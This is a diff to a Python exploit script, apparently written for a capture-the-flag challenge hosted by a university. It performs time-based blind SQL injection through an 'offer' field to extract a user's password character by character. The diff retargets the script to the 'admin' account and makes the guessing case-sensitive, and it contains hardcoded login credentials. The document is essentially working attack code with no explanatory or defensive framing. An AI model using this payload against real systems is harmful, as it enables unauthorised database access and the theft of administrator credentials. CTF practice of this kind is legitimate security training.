@@ -5,7 +5,7 @@ import string
 base_url = 'http://cyberchallenge.disi.unitn.it:50050'
 
 login_body = {'username': 'Serom', 'password':'Password'}
-username = "Serom1"
+username = "admin"
 
 r = requests.post(base_url+'/login', login_body)
 cookies = r.cookies
@@ -42,7 +42,7 @@ while(counter < length):
         current_try = password + char
 
         injection= f"AND (SELECT (SELECT password FROM user WHERE username = '{username}') \
-            like '{current_try}%') AND sleep(2)"
+            like BINARY '{current_try}%') AND sleep(2)"
         injection_body = {'offer': '15 ' + injection}
 
         time_init = datetime.now()
